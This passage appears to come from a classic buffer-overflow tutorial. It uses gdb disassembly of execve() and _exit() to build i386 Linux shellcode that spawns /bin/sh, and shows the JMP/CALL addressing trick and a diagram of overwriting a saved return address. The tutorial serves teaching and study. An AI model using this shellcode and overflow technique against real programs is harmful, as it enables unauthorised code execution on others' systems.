<a id=__codelineno-0-445 name=__codelineno-0-445 href=#__codelineno-0-445></a>0x80002c0 &lt;__execve+4&gt;: movl   $0xb,%eax
<a id=__codelineno-0-446 name=__codelineno-0-446 href=#__codelineno-0-446></a>0x80002c5 &lt;__execve+9&gt;: movl   0x8(%ebp),%ebx
<a id=__codelineno-0-447 name=__codelineno-0-447 href=#__codelineno-0-447></a>0x80002c8 &lt;__execve+12&gt;:        movl   0xc(%ebp),%ecx
<a id=__codelineno-0-448 name=__codelineno-0-448 href=#__codelineno-0-448></a>0x80002cb &lt;__execve+15&gt;:        movl   0x10(%ebp),%edx
<a id=__codelineno-0-449 name=__codelineno-0-449 href=#__codelineno-0-449></a>0x80002ce &lt;__execve+18&gt;:        int    $0x80
<a id=__codelineno-0-450 name=__codelineno-0-450 href=#__codelineno-0-450></a>0x80002d0 &lt;__execve+20&gt;:        movl   %eax,%edx
<a id=__codelineno-0-451 name=__codelineno-0-451 href=#__codelineno-0-451></a>0x80002d2 &lt;__execve+22&gt;:        testl  %edx,%edx
<a id=__codelineno-0-452 name=__codelineno-0-452 href=#__codelineno-0-452></a>0x80002d4 &lt;__execve+24&gt;:        jnl    0x80002e6 &lt;__execve+42&gt;
<a id=__codelineno-0-453 name=__codelineno-0-453 href=#__codelineno-0-453></a>0x80002d6 &lt;__execve+26&gt;:        negl   %edx
<a id=__codelineno-0-454 name=__codelineno-0-454 href=#__codelineno-0-454></a>0x80002d8 &lt;__execve+28&gt;:        pushl  %edx
<a id=__codelineno-0-455 name=__codelineno-0-455 href=#__codelineno-0-455></a>0x80002d9 &lt;__execve+29&gt;:        call   0x8001a34 &lt;__normal_errno_location&gt;
<a id=__codelineno-0-456 name=__codelineno-0-456 href=#__codelineno-0-456></a>0x80002de &lt;__execve+34&gt;:        popl   %edx
<a id=__codelineno-0-457 name=__codelineno-0-457 href=#__codelineno-0-457></a>0x80002df &lt;__execve+35&gt;:        movl   %edx,(%eax)
<a id=__codelineno-0-458 name=__codelineno-0-458 href=#__codelineno-0-458></a>0x80002e1 &lt;__execve+37&gt;:        movl   $0xffffffff,%eax
<a id=__codelineno-0-459 name=__codelineno-0-459 href=#__codelineno-0-459></a>0x80002e6 &lt;__execve+42&gt;:        popl   %ebx
<a id=__codelineno-0-460 name=__codelineno-0-460 href=#__codelineno-0-460></a>0x80002e7 &lt;__execve+43&gt;:        movl   %ebp,%esp
<a id=__codelineno-0-461 name=__codelineno-0-461 href=#__codelineno-0-461></a>0x80002e9 &lt;__execve+45&gt;:        popl   %ebp
<a id=__codelineno-0-462 name=__codelineno-0-462 href=#__codelineno-0-462></a>0x80002ea &lt;__execve+46&gt;:        ret
<a id=__codelineno-0-463 name=__codelineno-0-463 href=#__codelineno-0-463></a>0x80002eb &lt;__execve+47&gt;:        nop
<a id=__codelineno-0-464 name=__codelineno-0-464 href=#__codelineno-0-464></a>End of assembler dump.
<a id=__codelineno-0-465 name=__codelineno-0-465 href=#__codelineno-0-465></a>------------------------------------------------------------------------------
<a id=__codelineno-0-466 name=__codelineno-0-466 href=#__codelineno-0-466></a>
<a id=__codelineno-0-467 name=__codelineno-0-467 href=#__codelineno-0-467></a>Lets try to understand what is going on here. We&#39;ll start by studying main:
<a id=__codelineno-0-468 name=__codelineno-0-468 href=#__codelineno-0-468></a>
<a id=__codelineno-0-469 name=__codelineno-0-469 href=#__codelineno-0-469></a>------------------------------------------------------------------------------
<a id=__codelineno-0-470 name=__codelineno-0-470 href=#__codelineno-0-470></a>0x8000130 &lt;main&gt;:       pushl  %ebp
<a id=__codelineno-0-471 name=__codelineno-0-471 href=#__codelineno-0-471></a>0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
<a id=__codelineno-0-472 name=__codelineno-0-472 href=#__codelineno-0-472></a>0x8000133 &lt;main+3&gt;:     subl   $0x8,%esp
<a id=__codelineno-0-473 name=__codelineno-0-473 href=#__codelineno-0-473></a>
<a id=__codelineno-0-474 name=__codelineno-0-474 href=#__codelineno-0-474></a>    This is the procedure prelude.  It first saves the old frame pointer,
<a id=__codelineno-0-475 name=__codelineno-0-475 href=#__codelineno-0-475></a>    makes the current stack pointer the new frame pointer, and leaves 
<a id=__codelineno-0-476 name=__codelineno-0-476 href=#__codelineno-0-476></a>    space for the local variables. In this case its:
<a id=__codelineno-0-477 name=__codelineno-0-477 href=#__codelineno-0-477></a>
<a id=__codelineno-0-478 name=__codelineno-0-478 href=#__codelineno-0-478></a>    char *name[2];
<a id=__codelineno-0-479 name=__codelineno-0-479 href=#__codelineno-0-479></a>
<a id=__codelineno-0-480 name=__codelineno-0-480 href=#__codelineno-0-480></a>    or 2 pointers to a char. Pointers are a word long, so it leaves
<a id=__codelineno-0-481 name=__codelineno-0-481 href=#__codelineno-0-481></a>    space for two words (8 bytes).
<a id=__codelineno-0-482 name=__codelineno-0-482 href=#__codelineno-0-482></a>
<a id=__codelineno-0-483 name=__codelineno-0-483 href=#__codelineno-0-483></a>0x8000136 &lt;main+6&gt;:     movl   $0x80027b8,0xfffffff8(%ebp)
<a id=__codelineno-0-484 name=__codelineno-0-484 href=#__codelineno-0-484></a>
<a id=__codelineno-0-485 name=__codelineno-0-485 href=#__codelineno-0-485></a>    We copy the value 0x80027b8 (the address of the string &quot;/bin/sh&quot;)
<a id=__codelineno-0-486 name=__codelineno-0-486 href=#__codelineno-0-486></a>    into the first pointer of name[]. This is equivalent to:
<a id=__codelineno-0-487 name=__codelineno-0-487 href=#__codelineno-0-487></a>
<a id=__codelineno-0-488 name=__codelineno-0-488 href=#__codelineno-0-488></a>    name[0] = &quot;/bin/sh&quot;;
<a id=__codelineno-0-489 name=__codelineno-0-489 href=#__codelineno-0-489></a>
<a id=__codelineno-0-490 name=__codelineno-0-490 href=#__codelineno-0-490></a>0x800013d &lt;main+13&gt;:    movl   $0x0,0xfffffffc(%ebp)
<a id=__codelineno-0-491 name=__codelineno-0-491 href=#__codelineno-0-491></a>
<a id=__codelineno-0-492 name=__codelineno-0-492 href=#__codelineno-0-492></a>    We copy the value 0x0 (NULL) into the seconds pointer of name[].
<a id=__codelineno-0-493 name=__codelineno-0-493 href=#__codelineno-0-493></a>    This is equivalent to:
<a id=__codelineno-0-494 name=__codelineno-0-494 href=#__codelineno-0-494></a>
<a id=__codelineno-0-495 name=__codelineno-0-495 href=#__codelineno-0-495></a>    name[1] = NULL;
<a id=__codelineno-0-496 name=__codelineno-0-496 href=#__codelineno-0-496></a>
<a id=__codelineno-0-497 name=__codelineno-0-497 href=#__codelineno-0-497></a>    The actual call to execve() starts here.
<a id=__codelineno-0-498 name=__codelineno-0-498 href=#__codelineno-0-498></a>
<a id=__codelineno-0-499 name=__codelineno-0-499 href=#__codelineno-0-499></a>0x8000144 &lt;main+20&gt;:    pushl  $0x0
<a id=__codelineno-0-500 name=__codelineno-0-500 href=#__codelineno-0-500></a>
<a id=__codelineno-0-501 name=__codelineno-0-501 href=#__codelineno-0-501></a>    We push the arguments to execve() in reverse order onto the stack.
<a id=__codelineno-0-502 name=__codelineno-0-502 href=#__codelineno-0-502></a>    We start with NULL.
<a id=__codelineno-0-503 name=__codelineno-0-503 href=#__codelineno-0-503></a>
<a id=__codelineno-0-504 name=__codelineno-0-504 href=#__codelineno-0-504></a>0x8000146 &lt;main+22&gt;:    leal   0xfffffff8(%ebp),%eax
<a id=__codelineno-0-505 name=__codelineno-0-505 href=#__codelineno-0-505></a>
<a id=__codelineno-0-506 name=__codelineno-0-506 href=#__codelineno-0-506></a>    We load the address of name[] into the EAX register.
<a id=__codelineno-0-507 name=__codelineno-0-507 href=#__codelineno-0-507></a>
<a id=__codelineno-0-508 name=__codelineno-0-508 href=#__codelineno-0-508></a>0x8000149 &lt;main+25&gt;:    pushl  %eax
<a id=__codelineno-0-509 name=__codelineno-0-509 href=#__codelineno-0-509></a>
<a id=__codelineno-0-510 name=__codelineno-0-510 href=#__codelineno-0-510></a>    We push the address of name[] onto the stack.
<a id=__codelineno-0-511 name=__codelineno-0-511 href=#__codelineno-0-511></a>
<a id=__codelineno-0-512 name=__codelineno-0-512 href=#__codelineno-0-512></a>0x800014a &lt;main+26&gt;:    movl   0xfffffff8(%ebp),%eax
<a id=__codelineno-0-513 name=__codelineno-0-513 href=#__codelineno-0-513></a>
<a id=__codelineno-0-514 name=__codelineno-0-514 href=#__codelineno-0-514></a>    We load the address of the string &quot;/bin/sh&quot; into the EAX register.
<a id=__codelineno-0-515 name=__codelineno-0-515 href=#__codelineno-0-515></a>
<a id=__codelineno-0-516 name=__codelineno-0-516 href=#__codelineno-0-516></a>0x800014d &lt;main+29&gt;:    pushl  %eax
<a id=__codelineno-0-517 name=__codelineno-0-517 href=#__codelineno-0-517></a>
<a id=__codelineno-0-518 name=__codelineno-0-518 href=#__codelineno-0-518></a>    We push the address of the string &quot;/bin/sh&quot; onto the stack.
<a id=__codelineno-0-519 name=__codelineno-0-519 href=#__codelineno-0-519></a>
<a id=__codelineno-0-520 name=__codelineno-0-520 href=#__codelineno-0-520></a>0x800014e &lt;main+30&gt;:    call   0x80002bc &lt;__execve&gt;
<a id=__codelineno-0-521 name=__codelineno-0-521 href=#__codelineno-0-521></a>
<a id=__codelineno-0-522 name=__codelineno-0-522 href=#__codelineno-0-522></a>    Call the library procedure execve().  The call instruction pushes the
<a id=__codelineno-0-523 name=__codelineno-0-523 href=#__codelineno-0-523></a>    IP onto the stack.
<a id=__codelineno-0-524 name=__codelineno-0-524 href=#__codelineno-0-524></a>------------------------------------------------------------------------------
<a id=__codelineno-0-525 name=__codelineno-0-525 href=#__codelineno-0-525></a>
<a id=__codelineno-0-526 name=__codelineno-0-526 href=#__codelineno-0-526></a>   Now execve().  Keep in mind we are using a Intel based Linux system.  The
<a id=__codelineno-0-527 name=__codelineno-0-527 href=#__codelineno-0-527></a>syscall details will change from OS to OS, and from CPU to CPU.  Some will 
<a id=__codelineno-0-528 name=__codelineno-0-528 href=#__codelineno-0-528></a>pass the arguments on the stack, others on the registers.  Some use a software
<a id=__codelineno-0-529 name=__codelineno-0-529 href=#__codelineno-0-529></a>interrupt to jump to kernel mode, others use a far call.  Linux passes its 
<a id=__codelineno-0-530 name=__codelineno-0-530 href=#__codelineno-0-530></a>arguments to the system call on the registers, and uses a software interrupt 
<a id=__codelineno-0-531 name=__codelineno-0-531 href=#__codelineno-0-531></a>to jump into kernel mode.
<a id=__codelineno-0-532 name=__codelineno-0-532 href=#__codelineno-0-532></a>
<a id=__codelineno-0-533 name=__codelineno-0-533 href=#__codelineno-0-533></a>------------------------------------------------------------------------------
<a id=__codelineno-0-534 name=__codelineno-0-534 href=#__codelineno-0-534></a>0x80002bc &lt;__execve&gt;:   pushl  %ebp
<a id=__codelineno-0-535 name=__codelineno-0-535 href=#__codelineno-0-535></a>0x80002bd &lt;__execve+1&gt;: movl   %esp,%ebp
<a id=__codelineno-0-536 name=__codelineno-0-536 href=#__codelineno-0-536></a>0x80002bf &lt;__execve+3&gt;: pushl  %ebx
<a id=__codelineno-0-537 name=__codelineno-0-537 href=#__codelineno-0-537></a>
<a id=__codelineno-0-538 name=__codelineno-0-538 href=#__codelineno-0-538></a>    The procedure prelude.
<a id=__codelineno-0-539 name=__codelineno-0-539 href=#__codelineno-0-539></a>
<a id=__codelineno-0-540 name=__codelineno-0-540 href=#__codelineno-0-540></a>0x80002c0 &lt;__execve+4&gt;: movl   $0xb,%eax
<a id=__codelineno-0-541 name=__codelineno-0-541 href=#__codelineno-0-541></a>
<a id=__codelineno-0-542 name=__codelineno-0-542 href=#__codelineno-0-542></a>    Copy 0xb (11 decimal) onto the stack. This is the index into the
<a id=__codelineno-0-543 name=__codelineno-0-543 href=#__codelineno-0-543></a>    syscall table.  11 is execve.
<a id=__codelineno-0-544 name=__codelineno-0-544 href=#__codelineno-0-544></a>
<a id=__codelineno-0-545 name=__codelineno-0-545 href=#__codelineno-0-545></a>0x80002c5 &lt;__execve+9&gt;: movl   0x8(%ebp),%ebx
<a id=__codelineno-0-546 name=__codelineno-0-546 href=#__codelineno-0-546></a>
<a id=__codelineno-0-547 name=__codelineno-0-547 href=#__codelineno-0-547></a>    Copy the address of &quot;/bin/sh&quot; into EBX.
<a id=__codelineno-0-548 name=__codelineno-0-548 href=#__codelineno-0-548></a>
<a id=__codelineno-0-549 name=__codelineno-0-549 href=#__codelineno-0-549></a>0x80002c8 &lt;__execve+12&gt;:        movl   0xc(%ebp),%ecx
<a id=__codelineno-0-550 name=__codelineno-0-550 href=#__codelineno-0-550></a>
<a id=__codelineno-0-551 name=__codelineno-0-551 href=#__codelineno-0-551></a>    Copy the address of name[] into ECX.
<a id=__codelineno-0-552 name=__codelineno-0-552 href=#__codelineno-0-552></a>
<a id=__codelineno-0-553 name=__codelineno-0-553 href=#__codelineno-0-553></a>0x80002cb &lt;__execve+15&gt;:        movl   0x10(%ebp),%edx
<a id=__codelineno-0-554 name=__codelineno-0-554 href=#__codelineno-0-554></a>
<a id=__codelineno-0-555 name=__codelineno-0-555 href=#__codelineno-0-555></a>    Copy the address of the null pointer into %edx.
<a id=__codelineno-0-556 name=__codelineno-0-556 href=#__codelineno-0-556></a>
<a id=__codelineno-0-557 name=__codelineno-0-557 href=#__codelineno-0-557></a>0x80002ce &lt;__execve+18&gt;:        int    $0x80
<a id=__codelineno-0-558 name=__codelineno-0-558 href=#__codelineno-0-558></a>
<a id=__codelineno-0-559 name=__codelineno-0-559 href=#__codelineno-0-559></a>    Change into kernel mode.
<a id=__codelineno-0-560 name=__codelineno-0-560 href=#__codelineno-0-560></a>------------------------------------------------------------------------------
<a id=__codelineno-0-561 name=__codelineno-0-561 href=#__codelineno-0-561></a>
<a id=__codelineno-0-562 name=__codelineno-0-562 href=#__codelineno-0-562></a>So as we can see there is not much to the execve() system call.  All we need
<a id=__codelineno-0-563 name=__codelineno-0-563 href=#__codelineno-0-563></a>to do is:
<a id=__codelineno-0-564 name=__codelineno-0-564 href=#__codelineno-0-564></a>
<a id=__codelineno-0-565 name=__codelineno-0-565 href=#__codelineno-0-565></a>    a) Have the null terminated string &quot;/bin/sh&quot; somewhere in memory.
<a id=__codelineno-0-566 name=__codelineno-0-566 href=#__codelineno-0-566></a>    b) Have the address of the string &quot;/bin/sh&quot; somewhere in memory
<a id=__codelineno-0-567 name=__codelineno-0-567 href=#__codelineno-0-567></a>       followed by a null long word.
<a id=__codelineno-0-568 name=__codelineno-0-568 href=#__codelineno-0-568></a>    c) Copy 0xb into the EAX register.
<a id=__codelineno-0-569 name=__codelineno-0-569 href=#__codelineno-0-569></a>    d) Copy the address of the address of the string &quot;/bin/sh&quot; into the
<a id=__codelineno-0-570 name=__codelineno-0-570 href=#__codelineno-0-570></a>       EBX register.
<a id=__codelineno-0-571 name=__codelineno-0-571 href=#__codelineno-0-571></a>    e) Copy the address of the string &quot;/bin/sh&quot; into the ECX register.
<a id=__codelineno-0-572 name=__codelineno-0-572 href=#__codelineno-0-572></a>    f) Copy the address of the null long word into the EDX register.
<a id=__codelineno-0-573 name=__codelineno-0-573 href=#__codelineno-0-573></a>    g) Execute the int $0x80 instruction.
<a id=__codelineno-0-574 name=__codelineno-0-574 href=#__codelineno-0-574></a>
<a id=__codelineno-0-575 name=__codelineno-0-575 href=#__codelineno-0-575></a>   But what if the execve() call fails for some reason?  The program will
<a id=__codelineno-0-576 name=__codelineno-0-576 href=#__codelineno-0-576></a>continue fetching instructions from the stack, which may contain random data!
<a id=__codelineno-0-577 name=__codelineno-0-577 href=#__codelineno-0-577></a>The program will most likely core dump.  We want the program to exit cleanly
<a id=__codelineno-0-578 name=__codelineno-0-578 href=#__codelineno-0-578></a>if the execve syscall fails.  To accomplish this we must then add a exit
<a id=__codelineno-0-579 name=__codelineno-0-579 href=#__codelineno-0-579></a>syscall after the execve syscall.  What does the exit syscall looks like?
<a id=__codelineno-0-580 name=__codelineno-0-580 href=#__codelineno-0-580></a>
<a id=__codelineno-0-581 name=__codelineno-0-581 href=#__codelineno-0-581></a>exit.c
<a id=__codelineno-0-582 name=__codelineno-0-582 href=#__codelineno-0-582></a>------------------------------------------------------------------------------
<a id=__codelineno-0-583 name=__codelineno-0-583 href=#__codelineno-0-583></a>#include &lt;stdlib.h&gt;
<a id=__codelineno-0-584 name=__codelineno-0-584 href=#__codelineno-0-584></a>
<a id=__codelineno-0-585 name=__codelineno-0-585 href=#__codelineno-0-585></a>void main() {
<a id=__codelineno-0-586 name=__codelineno-0-586 href=#__codelineno-0-586></a>        exit(0);
<a id=__codelineno-0-587 name=__codelineno-0-587 href=#__codelineno-0-587></a>}
<a id=__codelineno-0-588 name=__codelineno-0-588 href=#__codelineno-0-588></a>------------------------------------------------------------------------------
<a id=__codelineno-0-589 name=__codelineno-0-589 href=#__codelineno-0-589></a>
<a id=__codelineno-0-590 name=__codelineno-0-590 href=#__codelineno-0-590></a>------------------------------------------------------------------------------
<a id=__codelineno-0-591 name=__codelineno-0-591 href=#__codelineno-0-591></a>[aleph1]$ gcc -o exit -static exit.c
<a id=__codelineno-0-592 name=__codelineno-0-592 href=#__codelineno-0-592></a>[aleph1]$ gdb exit
<a id=__codelineno-0-593 name=__codelineno-0-593 href=#__codelineno-0-593></a>GDB is free software and you are welcome to distribute copies of it
<a id=__codelineno-0-594 name=__codelineno-0-594 href=#__codelineno-0-594></a> under certain conditions; type &quot;show copying&quot; to see the conditions.
<a id=__codelineno-0-595 name=__codelineno-0-595 href=#__codelineno-0-595></a>There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details.
<a id=__codelineno-0-596 name=__codelineno-0-596 href=#__codelineno-0-596></a>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
<a id=__codelineno-0-597 name=__codelineno-0-597 href=#__codelineno-0-597></a>(no debugging symbols found)...
<a id=__codelineno-0-598 name=__codelineno-0-598 href=#__codelineno-0-598></a>(gdb) disassemble _exit
<a id=__codelineno-0-599 name=__codelineno-0-599 href=#__codelineno-0-599></a>Dump of assembler code for function _exit:
<a id=__codelineno-0-600 name=__codelineno-0-600 href=#__codelineno-0-600></a>0x800034c &lt;_exit&gt;:      pushl  %ebp
<a id=__codelineno-0-601 name=__codelineno-0-601 href=#__codelineno-0-601></a>0x800034d &lt;_exit+1&gt;:    movl   %esp,%ebp
<a id=__codelineno-0-602 name=__codelineno-0-602 href=#__codelineno-0-602></a>0x800034f &lt;_exit+3&gt;:    pushl  %ebx
<a id=__codelineno-0-603 name=__codelineno-0-603 href=#__codelineno-0-603></a>0x8000350 &lt;_exit+4&gt;:    movl   $0x1,%eax
<a id=__codelineno-0-604 name=__codelineno-0-604 href=#__codelineno-0-604></a>0x8000355 &lt;_exit+9&gt;:    movl   0x8(%ebp),%ebx
<a id=__codelineno-0-605 name=__codelineno-0-605 href=#__codelineno-0-605></a>0x8000358 &lt;_exit+12&gt;:   int    $0x80
<a id=__codelineno-0-606 name=__codelineno-0-606 href=#__codelineno-0-606></a>0x800035a &lt;_exit+14&gt;:   movl   0xfffffffc(%ebp),%ebx
<a id=__codelineno-0-607 name=__codelineno-0-607 href=#__codelineno-0-607></a>0x800035d &lt;_exit+17&gt;:   movl   %ebp,%esp
<a id=__codelineno-0-608 name=__codelineno-0-608 href=#__codelineno-0-608></a>0x800035f &lt;_exit+19&gt;:   popl   %ebp
<a id=__codelineno-0-609 name=__codelineno-0-609 href=#__codelineno-0-609></a>0x8000360 &lt;_exit+20&gt;:   ret
<a id=__codelineno-0-610 name=__codelineno-0-610 href=#__codelineno-0-610></a>0x8000361 &lt;_exit+21&gt;:   nop
<a id=__codelineno-0-611 name=__codelineno-0-611 href=#__codelineno-0-611></a>0x8000362 &lt;_exit+22&gt;:   nop
<a id=__codelineno-0-612 name=__codelineno-0-612 href=#__codelineno-0-612></a>0x8000363 &lt;_exit+23&gt;:   nop
<a id=__codelineno-0-613 name=__codelineno-0-613 href=#__codelineno-0-613></a>End of assembler dump.
<a id=__codelineno-0-614 name=__codelineno-0-614 href=#__codelineno-0-614></a>------------------------------------------------------------------------------
<a id=__codelineno-0-615 name=__codelineno-0-615 href=#__codelineno-0-615></a>
<a id=__codelineno-0-616 name=__codelineno-0-616 href=#__codelineno-0-616></a>   The exit syscall will place 0x1 in EAX, place the exit code in EBX,
<a id=__codelineno-0-617 name=__codelineno-0-617 href=#__codelineno-0-617></a>and execute &quot;int 0x80&quot;.  That&#39;s it.  Most applications return 0 on exit to
<a id=__codelineno-0-618 name=__codelineno-0-618 href=#__codelineno-0-618></a>indicate no errors.  We will place 0 in EBX.  Our list of steps is now:
<a id=__codelineno-0-619 name=__codelineno-0-619 href=#__codelineno-0-619></a>
<a id=__codelineno-0-620 name=__codelineno-0-620 href=#__codelineno-0-620></a>    a) Have the null terminated string &quot;/bin/sh&quot; somewhere in memory.
<a id=__codelineno-0-621 name=__codelineno-0-621 href=#__codelineno-0-621></a>    b) Have the address of the string &quot;/bin/sh&quot; somewhere in memory
<a id=__codelineno-0-622 name=__codelineno-0-622 href=#__codelineno-0-622></a>       followed by a null long word.
<a id=__codelineno-0-623 name=__codelineno-0-623 href=#__codelineno-0-623></a>    c) Copy 0xb into the EAX register.
<a id=__codelineno-0-624 name=__codelineno-0-624 href=#__codelineno-0-624></a>    d) Copy the address of the address of the string &quot;/bin/sh&quot; into the
<a id=__codelineno-0-625 name=__codelineno-0-625 href=#__codelineno-0-625></a>       EBX register.
<a id=__codelineno-0-626 name=__codelineno-0-626 href=#__codelineno-0-626></a>    e) Copy the address of the string &quot;/bin/sh&quot; into the ECX register.
<a id=__codelineno-0-627 name=__codelineno-0-627 href=#__codelineno-0-627></a>    f) Copy the address of the null long word into the EDX register.
<a id=__codelineno-0-628 name=__codelineno-0-628 href=#__codelineno-0-628></a>    g) Execute the int $0x80 instruction.
<a id=__codelineno-0-629 name=__codelineno-0-629 href=#__codelineno-0-629></a>    h) Copy 0x1 into the EAX register.
<a id=__codelineno-0-630 name=__codelineno-0-630 href=#__codelineno-0-630></a>    i) Copy 0x0 into the EBX register.
<a id=__codelineno-0-631 name=__codelineno-0-631 href=#__codelineno-0-631></a>    j) Execute the int $0x80 instruction.
<a id=__codelineno-0-632 name=__codelineno-0-632 href=#__codelineno-0-632></a>
<a id=__codelineno-0-633 name=__codelineno-0-633 href=#__codelineno-0-633></a>   Trying to put this together in assembly language, placing the string
<a id=__codelineno-0-634 name=__codelineno-0-634 href=#__codelineno-0-634></a>after the code, and remembering we will place the address of the string,
<a id=__codelineno-0-635 name=__codelineno-0-635 href=#__codelineno-0-635></a>and null word after the array, we have:
<a id=__codelineno-0-636 name=__codelineno-0-636 href=#__codelineno-0-636></a>
<a id=__codelineno-0-637 name=__codelineno-0-637 href=#__codelineno-0-637></a>------------------------------------------------------------------------------
<a id=__codelineno-0-638 name=__codelineno-0-638 href=#__codelineno-0-638></a>        movl   string_addr,string_addr_addr
<a id=__codelineno-0-639 name=__codelineno-0-639 href=#__codelineno-0-639></a>    movb   $0x0,null_byte_addr
<a id=__codelineno-0-640 name=__codelineno-0-640 href=#__codelineno-0-640></a>        movl   $0x0,null_addr
<a id=__codelineno-0-641 name=__codelineno-0-641 href=#__codelineno-0-641></a>        movl   $0xb,%eax
<a id=__codelineno-0-642 name=__codelineno-0-642 href=#__codelineno-0-642></a>        movl   string_addr,%ebx
<a id=__codelineno-0-643 name=__codelineno-0-643 href=#__codelineno-0-643></a>        leal   string_addr,%ecx
<a id=__codelineno-0-644 name=__codelineno-0-644 href=#__codelineno-0-644></a>        leal   null_string,%edx
<a id=__codelineno-0-645 name=__codelineno-0-645 href=#__codelineno-0-645></a>        int    $0x80
<a id=__codelineno-0-646 name=__codelineno-0-646 href=#__codelineno-0-646></a>        movl   $0x1, %eax
<a id=__codelineno-0-647 name=__codelineno-0-647 href=#__codelineno-0-647></a>        movl   $0x0, %ebx
<a id=__codelineno-0-648 name=__codelineno-0-648 href=#__codelineno-0-648></a>    int    $0x80
<a id=__codelineno-0-649 name=__codelineno-0-649 href=#__codelineno-0-649></a>        /bin/sh string goes here.
<a id=__codelineno-0-650 name=__codelineno-0-650 href=#__codelineno-0-650></a>------------------------------------------------------------------------------
<a id=__codelineno-0-651 name=__codelineno-0-651 href=#__codelineno-0-651></a>
<a id=__codelineno-0-652 name=__codelineno-0-652 href=#__codelineno-0-652></a>   The problem is that we don&#39;t know where in the memory space of the 
<a id=__codelineno-0-653 name=__codelineno-0-653 href=#__codelineno-0-653></a>program we are trying to exploit the code (and the string that follows 
<a id=__codelineno-0-654 name=__codelineno-0-654 href=#__codelineno-0-654></a>it) will be placed.  One way around it is to use a JMP, and a CALL 
<a id=__codelineno-0-655 name=__codelineno-0-655 href=#__codelineno-0-655></a>instruction.  The JMP and CALL instructions can use IP relative addressing, 
<a id=__codelineno-0-656 name=__codelineno-0-656 href=#__codelineno-0-656></a>which means we can jump to an offset from the current IP without needing 
<a id=__codelineno-0-657 name=__codelineno-0-657 href=#__codelineno-0-657></a>to know the exact address of where in memory we want to jump to.  If we 
<a id=__codelineno-0-658 name=__codelineno-0-658 href=#__codelineno-0-658></a>place a CALL instruction right before the &quot;/bin/sh&quot; string, and a JMP 
<a id=__codelineno-0-659 name=__codelineno-0-659 href=#__codelineno-0-659></a>instruction to it, the strings address will be pushed onto the stack as 
<a id=__codelineno-0-660 name=__codelineno-0-660 href=#__codelineno-0-660></a>the return address when CALL is executed.  All we need then is to copy the 
<a id=__codelineno-0-661 name=__codelineno-0-661 href=#__codelineno-0-661></a>return address into a register.  The CALL instruction can simply call the 
<a id=__codelineno-0-662 name=__codelineno-0-662 href=#__codelineno-0-662></a>start of our code above.  Assuming now that J stands for the JMP instruction,
<a id=__codelineno-0-663 name=__codelineno-0-663 href=#__codelineno-0-663></a>C for the CALL instruction, and s for the string,  the execution flow would 
<a id=__codelineno-0-664 name=__codelineno-0-664 href=#__codelineno-0-664></a>now be:
<a id=__codelineno-0-665 name=__codelineno-0-665 href=#__codelineno-0-665></a>
<a id=__codelineno-0-666 name=__codelineno-0-666 href=#__codelineno-0-666></a>
<a id=__codelineno-0-667 name=__codelineno-0-667 href=#__codelineno-0-667></a>bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
<a id=__codelineno-0-668 name=__codelineno-0-668 href=#__codelineno-0-668></a>memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
<a id=__codelineno-0-669 name=__codelineno-0-669 href=#__codelineno-0-669></a>           buffer                sfp   ret   a     b     c
<a id=__codelineno-0-670 name=__codelineno-0-670 href=#__codelineno-0-670></a>
<a id=__codelineno-0-671 name=__codelineno-0-671 href=#__codelineno-0-671></a>&lt;------   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
<a id=__codelineno-0-672 name=__codelineno-0-672 href=#__codelineno-0-672></a>           ^|^             ^|            |
<a id=__codelineno-0-673 name=__codelineno-0-673 href=#__codelineno-0-673></a>           |||_____________||____________| (1)
<a id=__codelineno-0-674 name=__codelineno-0-674 href=#__codelineno-0-674></a>       (2)  ||_____________||
<a id=__codelineno-0-675 name=__codelineno-0-675 href=#__codelineno-0-675></a>             |______________| (3)
<a id=__codelineno-0-676 name=__codelineno-0-676 href=#__codelineno-0-676></a>top of                                                            bottom of
<a id=__codelineno-0-677 name=__codelineno-0-677 href=#__codelineno-0-677></a>stack                                                                 stack
<a id=__codelineno-0-678 name=__codelineno-0-678 href=#__codelineno-0-678></a>
<a id=__codelineno-0-679 name=__codelineno-0-679 href=#__codelineno-0-679></a>
<a id=__codelineno-0-680 name=__codelineno-0-680 href=#__codelineno-0-680></a>
<a id=__codelineno-0-681 name=__codelineno-0-681 href=#__codelineno-0-681></a>   With this modifications, using indexed addressing, and writing down how
<a id=__codelineno-0-682 name=__codelineno-0-682 href=#__codelineno-0-682></a>many bytes each instruction takes our code looks like:
<a id=__codelineno-0-683 name=__codelineno-0-683 href=#__codelineno-0-683></a>
<a id=__codelineno-0-684 name=__codelineno-0-684 href=#__codelineno-0-684></a>------------------------------------------------------------------------------
<a id=__codelineno-0-685 name=__codelineno-0-685 href=#__codelineno-0-685></a>        jmp    offset-to-call           # 2 bytes
<a id=__codelineno-0-686 name=__codelineno-0-686 href=#__codelineno-0-686></a>        popl   %esi                     # 1 byte
<a id=__codelineno-0-687 name=__codelineno-0-687 href=#__codelineno-0-687></a>        movl   %esi,array-offset(%esi)  # 3 bytes
<a id=__codelineno-0-688 name=__codelineno-0-688 href=#__codelineno-0-688></a>        movb   $0x0,nullbyteoffset(%esi)# 4 bytes
<a id=__codelineno-0-689 name=__codelineno-0-689 href=#__codelineno-0-689></a>        movl   $0x0,null-offset(%esi)   # 7 bytes
<a id=__codelineno-0-690 name=__codelineno-0-690 href=#__codelineno-0-690></a>        movl   $0xb,%eax                # 5 bytes
<a id=__codelineno-0-691 name=__codelineno-0-691 href=#__codelineno-0-691></a>        movl   %esi,%ebx                # 2 bytes
<a id=__codelineno-0-692 name=__codelineno-0-692 href=#__codelineno-0-692></a>        leal   array-offset,(%esi),%ecx # 3 bytes
<a id=__codelineno-0-693 name=__codelineno-0-693 href=#__codelineno-0-693></a>        leal   null-offset(%esi),%edx   # 3 bytes
<a id=__codelineno-0-694 name=__codelineno-0-694 href=#__codelineno-0-694></a>        int    $0x80                    # 2 bytes
<a id=__codelineno-0-695 name=__codelineno-0-695 href=#__codelineno-0-695></a>        movl   $0x1, %eax       # 5 bytes
<a id=__codelineno-0-696 name=__codelineno-0-696 href=#__codelineno-0-696></a>        movl   $0x0, %ebx       # 5 bytes
<a id=__codelineno-0-697 name=__codelineno-0-697 href=#__codelineno-0-697></a>    int    $0x80            # 2 bytes
